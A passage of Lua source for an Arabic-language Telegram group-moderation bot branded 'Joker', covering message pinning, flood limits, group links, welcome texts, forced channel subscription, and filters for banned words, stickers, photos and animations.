' }\n'..' ⋄الماركدون »> { '..lock_mark..
' }\n'..' ⋄التعديل »> { '..lock_edit..
' }\n'..' ⋄تعديل الميديا »> { '..lock_edit_med..
' }\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•'..
'\n'..' ⋄الكلايش »> { '..lock_spam..
' }\n'..' ⋄الكيبورد »> { '..lock_inlin..
' }\n'..' ⋄الاغاني »> { '..lock_vico..
' }\n'..' ⋄المتحركه »> { '..lock_gif..
' }\n'..' ⋄الملفات »> { '..lock_file..
' }\n'..' ⋄الدردشه »> { '..lock_text..
' }\n'..' ⋄ الفيديو »> { '..lock_ved..
' }\n'..' ⋄ الصور »> { '..lock_photo..
' }\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•'..
'\n'..' ⋄ الصوت »> { '..lock_muse..
' }\n'..' ⋄الملصقات »> { '..lock_ste..
' }\n'..' ⋄الجهات »> { '..lock_phon..
' }\n'..' ⋄الدخول »> { '..lock_join..
' }\n'..' ⋄الاضافه »> { '..lock_add..
' }\n'..' ⋄السيلفي »> { '..lock_self..
' }\n'..' ⋄الالعاب »> { '..lock_geam..
' }\n'..' ⋄التكرار »> { '..flood..
' }\n'..' ⋄الترحيب »> { '..welcome..
' }\n'..' ⋄عدد التكرار »> { '..NUM_MSG_MAX..
' }\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•'..
'\n⋄علامة ال {🔓} تعني مفعل'..
'\n⋄علامة ال {🔐} تعني معطل'..
'\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•'..
'\n'..' ⋄امر صيح »> { '..kickme..
' }\n'..' ⋄امر اطردني »> { '..sehuser..
' }\n'..' ⋄امر مين ضافني »> { '..addme..
' }\n'..' ⋄الردود »> { '..rdmder..
' }\n'..' ⋄الردود العامه »> { '..rdsudo..
' }\n'..' ⋄الايدي »> { '..idgp..
' }\n'..' ⋄الايدي بالصوره »> { '..idph..
' }\n'..' ⋄الرفع »> { '..setadd..
' }\n'..' ⋄الحظر »> { '..banm..' }\n\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n⋄قناة سورس بلاك ↓\n[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁.](t.me/SOPOWERB0T) \n'
send(msg.chat_id_, msg.id_,text)     
end
if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ⋄عذرآ تم قفل التثبيت")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ⋄تم تثبيت الرساله")   
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ⋄انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ⋄لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ⋄ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil) 
end
if text == 'الغاء التثبيت' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ⋄عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ⋄تم الغاء تثبيت الرساله")   
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ⋄انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ⋄لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ⋄ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text == 'الغاء تثبيت الكل' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ⋄عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"⋄تم الغاء تثبيت الكل")   
https.request('https://api.telegram.org/bot'..token..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ⋄انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ⋄لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ⋄ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text and text:match('^ضع تكرار (%d+)$') and Mod(msg) then   
local Num = text:match('ضع تكرار (.*)')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
send(msg.chat_id_, msg.id_,' ⋄تم وضع عدد التكرار ('..Num..')')  
end 
if text and text:match('^ضع زمن التكرار (%d+)$') and Mod(msg) then   
local Num = text:match('^ضع زمن التكرار (%d+)$')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num) 
send(msg.chat_id_, msg.id_,' ⋄تم وضع زمن التكرار ('..Num..')') 
end
if text == "ضع رابط" or text == 'وضع رابط' then
if msg.reply_to_message_id_ == 0  then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
send(msg.chat_id_,msg.id_," ⋄حسنآ ارسل اليه الرابط الان")
database:setex(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false
end
end
if text == 'بوت' or text == 'البوت' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local f = io.open("./Files/RDBOT.lua", "r")  
if f then
return false
end
local TEXT_BOT = database:get(bot_id..'TEXT_BOT')
if TEXT_BOT then 
send(msg.chat_id_, msg.id_,TEXT_BOT)
else
send(msg.chat_id_, msg.id_,'اسمي '..Name_Bot)
end
end

if text == 'رقمي' then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
MyNumber = "⋄رقمك `"..result.phone_number_..'`'
else
MyNumber = "⋄رقمك مخفي"
end
send(msg.chat_id_, msg.id_,MyNumber)
end,nil)
end

if text == 'المطور' or text == 'مطور' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local TEXT_SUDO = database:get(bot_id..'TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result) 
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
end,nil)
end
end

if text == ("قائمه الكتم العام") then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Gmute:User')
t = "\n⋄قائمة المكتومين عام \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد مكتومين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
---------------------
if text == "تفعيل صورتي" or text == 'تفعيل الصوره' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if Constructor(msg) then  
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," ⋄تم تفعيل الصوره") 
return false end
end
if text == "تعطيل الصوره" or text == 'تعطيل صورتي' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if Constructor(msg) then  
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," ⋄تم تعطيل الصوره") 
return false end
end

if text == "الرابط" then 
local url = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..msg.chat_id_)
local dataa = json:decode(url)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or 'https://t.me/'..dataa.result.username or dataa.result.invite_link
local Teext = '⋄'..ta.title_..'\n'..link 
local inline = {{{text = ta.title_, url=link}},} 
send_inline_key(msg.chat_id_,Teext,nil,inline,msg.id_/2097152/0.5) 
else 
send(msg.chat_id_, msg.id_,'⋄لا يوجد رابط ارسل ضع رابط') 
end 
end,nil) 
end

if text == 'مسح الرابط' or text == 'تغير الرابط' then
if Mod(msg) then     
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
send(msg.chat_id_,msg.id_," ⋄تم مسح الرابط")
database:del(bot_id.."Private:Group:Link"..msg.chat_id_) 
return false    
end
end

if text and text:match("^ضع صوره") and Mod(msg) and msg.reply_to_message_id_ == 0 then  
database:set(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_,true) 
send(msg.chat_id_, msg.id_,' ⋄ارسل لي الصوره') 
return false
end
if text == "مسح الصوره" or text == "مسح الصوره" then 
if Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' ⋄تم ازالة صورة الجروب') 
end
return false  
end
if text == 'ضع وصف' or text == 'وضع وصف' then  
if Mod(msg) then
database:setex(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_,' ⋄ارسل الان الوصف')
end
return false  
end
if text == 'ضع ترحيب' or text == 'وضع ترحيب' then  
if Mod(msg) then
database:setex(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
t  = ' ⋄ارسل لي الترحيب الان'
tt = '\n⋄تستطيع اضافة مايلي !\n⋄دالة عرض الاسم »{`name`}\n⋄دالة عرض المعرف »{`user`}'
send(msg.chat_id_, msg.id_,t..tt) 
end
return false  
end
if text == 'الترحيب' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
GetWelcome = GetWelcomeGroup
else 
GetWelcome = ' ⋄لم يتم تعيين ترحيب للجروب'
end 
send(msg.chat_id_, msg.id_,'['..GetWelcome..']') 
return false  
end
if text == 'تفعيل الترحيب' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:set(bot_id..'Chek:Welcome'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,' ⋄تم تفعيل ترحيب الجروب') 
return false  
end
if text == 'تعطيل الترحيب' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:del(bot_id..'Chek:Welcome'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل ترحيب الجروب') 
return false  
end
if text == 'مسح الترحيب' or text == 'مسح الترحيب' then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' ⋄تم ازالة ترحيب الجروب') 
end
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager2(msg)  then       
send(msg.chat_id_, msg.id_," ⋄ارسل الكلمه لمنعها")  
database:set(bot_id.."Black1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Black1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ⋄ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."Black1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Black1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Black1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Black1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ⋄تم منع الكلمه مع التحذير")  
database:del(bot_id.."Black1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Black1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Black1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Black1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end    
send(msg.chat_id_, msg.id_," ⋄ارسل الكلمه الان")  
database:set(bot_id.."Black1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Black1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_," ⋄تم الغاء منعها")  
database:del(bot_id.."Black1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Black1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Black1:List:Filter"..msg.chat_id_,text)  
return false  end  
end


if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end     
function cb(a,b,c) 
textt = ' ⋄تم منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:sadd(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:sadd(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:sadd(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end     
function cb(a,b,c) 
textt = ' ⋄تم الغاء منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:srem(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:srem(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:srem(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == "مسح قائمه المنع" then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end   
local list = database:smembers(bot_id.."Black1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Black1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Black1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Black1:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_," ⋄تم مسح قائمه المنع")  
end
if text == "قائمه المنع" then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end   
local list = database:smembers(bot_id.."Black1:List:Filter"..msg.chat_id_)  
t = "\n⋄قائمة المنع \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do  
local Black_Msg = database:get(bot_id.."Black1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." »> {"..Black_Msg.."}\n"    
end  
if #list == 0 then  
t = " ⋄لا يوجد كلمات ممنوعه"  
end  
send(msg.chat_id_, msg.id_,t)  
end  
if text == 'مسح قائمه منع المتحركات' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end     
database:del(bot_id.."filteranimation"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' ⋄تم مسح قائمه منع المتحركات')  
end
if text == 'مسح قائمه منع الصور' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end     
database:del(bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' ⋄تم مسح قائمه منع الصور')  
end
if text == 'مسح قائمه منع الملصقات' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end     
database:del(bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' ⋄تم مسح قائمه منع الملصقات')  
end
------------------
if text == 'مسح كليشه المطور' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ⋄تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:set(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,' ⋄ارسل الكليشه الان')
return false
end
if text and database:get(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' then 
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ⋄تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'TEXT_SUDO',text)
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ⋄تم حفظ كليشة المطور')
return false
end
-----------------
if text == 'مسح رد بوت' then
if not SudoBot2(msg) then
